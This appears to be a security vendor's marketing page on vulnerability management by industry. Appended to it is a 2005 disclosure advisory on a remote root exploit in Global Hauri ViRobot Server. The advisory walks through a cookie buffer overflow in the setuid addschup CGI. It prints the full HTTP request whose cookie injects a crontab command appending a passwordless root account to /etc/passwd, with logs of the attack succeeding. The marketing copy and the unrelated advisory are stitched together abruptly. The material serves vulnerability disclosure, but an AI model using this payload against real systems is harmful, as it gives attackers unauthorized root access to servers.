## **Vulnerability Management for a Variety of Industries**

Nearly every industry relies on applications and networks to conduct business, though some have more stringent security requirements than others. Organizations in the aviation, automotive, healthcare, and financial sectors have some of the strongest security regulations. Layers of security during software and application development as well as after product deployment are necessary to keep consumers safe and organizations compliant.

![airplane icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilitiesaviation.png)

### [Aviation](https://www.beyondsecurity.com/resources/guides/aviation-software-testing-guide)

Cybersecurity is crucial to the aviation industry. Travelers in the sky need to be protected from any attacks that can prevent airlines from operating normally. Those same customers need to have their payment and sensitive data protected when purchasing a ticket.

### [Automotive](https://www.beyondsecurity.com/resources/guide/how-fuzz-testing-helps-secure-automotive-industry)

Wireless connectivity is becoming commonplace inside of new vehicles. Automotive connectivity to WIFI and Bluetooth are making vehicles a bigger target for cybercriminals. One vulnerability can take down any vehicle with that technology. DAST, Black Box Fuzzing, and SAST during development are a solid foundation of security to prevent these attacks.

![](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-automative.png)

![heartbeat](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-healthcare.png)

### [Healthcare and Medical](https://www.beyondsecurity.com/resources/guides/security-testing-for-networked-medical-devices)

Wireless technology and application software are being used more in medical devices to automate and monitor individual healthcare needs. Device security is the utmost priority, preventing risks that can directly endanger lives. Application security is needed to prevent cyber attackers from tampering with devices and stealing private healthcare data. SAST and DAST during development can help find vulnerabilities that can compromise these devices.

### Critical Infrastructure and Industrial Facilities

Water, power, and gas are some prime targets for large scale attacks. The best way to keep cyberattackers from taking down an entire city’s water supply is to create a layered cybersecurity portfolio. From the start, vulnerabilities need to be identified, remediated, and constantly monitored to prevent a mass standstill of public utilities.

![lightning bolt icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-critical-industries.png)

![factory](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-manufactures.png)

### Discrete Manufacturers

Manufacturing industries keep building and assembling essential pieces for everyday life. Any attack on that automation would create a bottleneck in multiple industries that rely on these products. A disruption in manufacturing has been proven to drive up prices and create a negative workflow ripple worldwide. Using layered security solutions prior to deployment and scanning afterwards will help prevent any shutdown.

### Financial

Financial institutions are still top cyberattacker targets. Monetary apps for banks, credit unions, investment, and retirement firms need the highest cybersecurity measures. Security that prevents cyberattacks should be implemented during development and embedded directly into these applications. Compliance for this industry is only growing with each reported breach.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

DMA[2005-0614a] - 'Global Hauri ViRobot Server cookie overflow'
Author: Kevin Finisterre
Vendor: <http://www.globalhauri.com>
Product: 'ViRobot Linux (and Unix?) Server'

Description:
HAURI, Inc. is a leading anti-virus solution provider in the global market.
The "ViRobot" which was developed exclusively by HAURI, is an excellent and
powerful anti-virus that uses a unique type of detection engine technology
to detect the latest viruses and to repair files infected with those viruses.
The HAURI anti-virus technology is regarded highly in Korea and has received
rave reviews from all over the world.

HAURI has a customer base in multiple parts of the world:
US & Canada : Global HAURI Inc. - <http://www.globalhauri.com>
Singapore : HAURI ASIA Pte Ltd. - <http://www.hauri.com.sg>
Japan : HAURI JAPAN Inc. - <http://www.hauri.co.jp>
China : China Blue Star Hauri Technology Co., Ltd. - <http://www.hauri.com.cn>
Latin/Mexico : HAURI Latinoamerica S.A. - <http://www.haurilatin.com>
Latin/Brazil : Hauri do Brazil - <http://www.haurilatin.com>
Europe : Hauri Europe GmbH - <http://www.hauri-europe.com>
Korea : HAURI Inc. - <http://www.hauri.co.kr>

HAURI, Inc. is also a GSA Schedule compatible company.

Our testing was performed against the 60 Day ViRobot trial located at:
<http://www.globalhauri.com/html/download/down_linux_end.html>
b37ae48a9c46985a753f5d28588753c2  /home/kfinisterre/linux_eng_60days.tar.gz

Both ViRobot Unix Server and ViRobot Linux Server have a user-friendly web-based
control interface. Access control is built into the system to ensure that only
authorized personnel can have control of the server. Unfortunately the system
makes use of cookie based authentication in an insecure manor.

During our trial run we found that the /usr/local/ViRobot/cgi-bin/addschup binary
is vulnerable to a trivial remote expoit. In order to explain the bug we can make
use of multiple exported variables to simulate a remote request. Below we show
the environmental conditions necessary to exploit addschup remotely.

The fact that addschup is setuid helps make this both a local and remote root.
jdam:/usr/local/ViRobot/cgi-bin# ls -al addschup
-rwsr-sr-x  1 root staff 26484 2005-01-05 01:30 addschup

We need to set the following variables in order to behave as if a browser request
was made.
kfinisterre@jdam:/tmp$ export REMOTE_ADDR=127.0.0.1
kfinisterre@jdam:/tmp$ export REQUEST_METHOD=POST
kfinisterre@jdam:/tmp$ export CONTENT_TYPE=application/x-www-form-urlencoded
kfinisterre@jdam:/tmp$ export CONTENT_LENGTH=1
kfinisterre@jdam:/tmp$ export PATH=$PATH:/sbin:/usr/sbin

At this point the cgi binary should run however it will complain that we have
not authenticated.

<font size=2>You need to authenticate.</font>

> From the usage of ltrace we found that the request for authentication is checked \
> via
a cookie with the paramaters "ViRobot_ID" and "ViRobot_PASS". The ViRobot_PASS is
optional for exploitation. For the time being setting the ViRobot_ID to a string of
36 chars should work just fine.

kfinisterre@jdam:/tmp$ export HTTP_COOKIE=ViRobot_ID=<36 chars>

Because we set out CONTENT_LENGTH to 1 earlier we must send at least one char to the
stdin of the addschup binary. When addschup is satisfied with all environment of the
variables and the input from stdin it will attempt to create a crontab file for root.
Since we are running the program as a regular binary rather than as a cgi the output
html that the web browser should recieve is dumped to the terminal.

kfinisterre@jdam:/usr/local/ViRobot/cgi-bin$ echo a | ./addschup
Content-type:text/html

<HTML>
<HEAD></HEAD>
<BODY bgcolor=#FFFFFF text=#000000>
<META HTTP-EQUIV="REFRESH" CONTENT="0; url=/cgi-bin/schupdate">
</BODY>
</HTML>

In the above example we chose to use a ViRobot_ID of 36 chars. We did this in order
to outline the basis of the vulnerability. As mentioned above addschup attempts to \
add the scheduled update to roots crontab in /var/spool/cron/root. Unfortunately the
author of ViRobot made use of a small buffer to hold the username from the cookie \
data. Because of this some of our userinput has spilled over into the buffer that is \
supposed to contain the entry that will be placed in the crontab file. The result as \
you can see is a string of four A's in roots crontab just before the vrupdate \
command.

The above example causes a root crontab entry with malicious userinput.
kfinisterre@jdam:/usr/local/ViRobot/cgi-bin$ cat /var/spool/cron/root
* * * * * AAAA/ViRobot/vrupdate -s > /dev/null 2>&1

The below output from gdb outlines the usage of a small 32 byte buffer to store the \
user name for ViRobot. The data stored in the username variable comes from the \
HTTP_COOKIE's  ViRobot_ID field, if this data is longer than 32 chars it will wind up \
bleeding over  into the install_path variable.

This is an example of a valid username stored in the username buffer:
0x8052e00 <username>:    "virobotadmin-aaaaaaaaaaaa"
0x8052e1c <username+28>:         ""
0x8052e1d <username+29>:         ""
0x8052e1e <username+30>:         ""
0x8052e1f <username+31>:         ""
0x8052e20 <install_path>:        "/usr/local"

This however shows an overflown username bleeding into the install path.
0x8052e00 <username>:    "virobotadmin-aaaaaaaaaaaa", 'A' <repeats 183 times>...
0x8052ec8 <install_path+168>:    'A' <repeats 200 times>...

Overflowing the install_path alone is not enough for exploitation. Lucky for us the
install_path is used later on as a prefix for the crontab entry. This data shows what \
the  cron entry looks like both before and after the overflow of the username field.

0x8052f70:       "¼p\025@¼p\025@* /usr/local/ViRobot/vrupdate -s > /dev/null 2>&1\n"

0x8052f70:       "¼p\025@¼p\025@* AAAAA/ViRobot/vrupdate -s > /dev/null 2>&1\n"

In essence what happens is that We control the 6th paramater passed to an fprintf \
call  that uses the following format.
0x804a740 <_IO_stdin_used+572>:  "%s %s %s %s %s %s/%s/vrupdate -s > /dev/null \
2>&1\n"

Controlling the data that is written to roots crontab obviously gives us some \
flexibility  for exploitation. Unfortunately we do not have any control over some of \
the crontab data however this does not pose any issue when exploiting the condition.

After writing the data to /var/spool/cron/root virobot executes the following \
commands:  killall crond > /dev/null
/etc/rc.d/init.d/crond restart > /dev/null

If we combine the fact that we can write to roots crontab with the fact that this can \
all  be done remotely we wind up with a nice exploit.

The above malformed queries can simply be sent via http with the following request:
POST /cgi-bin/addschup HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.3) Gecko/20041007 \
                Debian/1.7.3-5
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5

Content-type: application/x-www-form-urlencoded
Content-length: 1
Cookie: ViRobot_ID=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/echo \
r00t::0:0:root:/root:/bin/bash >> /etc/passwd &

The logs on the host being attacked will resemble the following:

in /usr/local/ViRobot/var/apache/access_log:
192.168.1.201 - - [23/Jan/2005:16:51:00 -0500] "POST /cgi-bin/addschup HTTP/1.1" 200 \
149

in /var/log/messages:
Jan 23 16:51:00 localhost crond: crond startup succeeded

in /var/log/cron:
Jan 23 16:21:44 localhost crond[1779]: (CRON) STARTUP (fork ok)
Jan 23 16:21:45 localhost anacron[1788]: Anacron 2.3 started on 2005-01-23

Jan 23 16:21:45 localhost anacron[1788]: Will run job `cron.monthly' in 75 min.
Jan 23 16:21:45 localhost anacron[1788]: Jobs will be executed sequentially
Jan 23 16:50:59 localhost crond[2317]: (CRON) STARTUP (fork ok)
Jan 23 16:51:00 localhost CROND[2322]: (root) CMD (/bin/echo \
r00t::0:0:root:/root:/bin/bash >> /etc/passwd & /ViRobot/vrupdate -s > /dev/null \
                2>&1)
Jan 23 16:52:00 localhost CROND[2372]: (root) CMD (/bin/echo \
r00t::0:0:root:/root:/bin/bash >> /etc/passwd & /ViRobot/vrupdate -s > /dev/null \
2>&1)

in /etc/passwd (per our example).
r00t::0:0:root:/root:/bin/bash
r00t::0:0:root:/root:/bin/bash
Keep in mind that output will be added every minute cron runs unless the attack has \
been cleaned up.

This has been tested on the default version of Redhat 9 with vixie-cron-3.0.1-74 and \
Debian 3.1 with  cron-3.0pl1-86. The redhat system was exploited instantly.  With \
debian however the cron package makes  use of /var/spool/cron/crontabs/ which \
prevents the malformed crontab from being executed. Debian users  with ViRobot may \
have made their system exploitable in efforts to have full functionality. This could \
have   been done via "ln -s /var/spool/cron/root/ /var/spool/cron/crontabs/root".

Please note that the addschup is not the only binary that overflows via the above \
mentioned method. We  found that addschup provided the best remote exploitation. \
Other binaries may provide other local or remote attack vectors.

Work Around:
Chmod -s every virobot binary in sight and filter remote access to the web interface. \

Timeline associated with this bug:
Wed, 14 Mar 2005 Tired of sitting on the information, public disclosure.

Please note that the vendor was NOT notified based on prior frustrating disclosure \
attempts.  After the release of SRT2003-08-11-0729 (via SnoSoft) I made the decision \
to not deal with the company  moving forward.

Thanks to Alex Hernandez for turning me on to this product and the fact that it is \
                full of bugs!
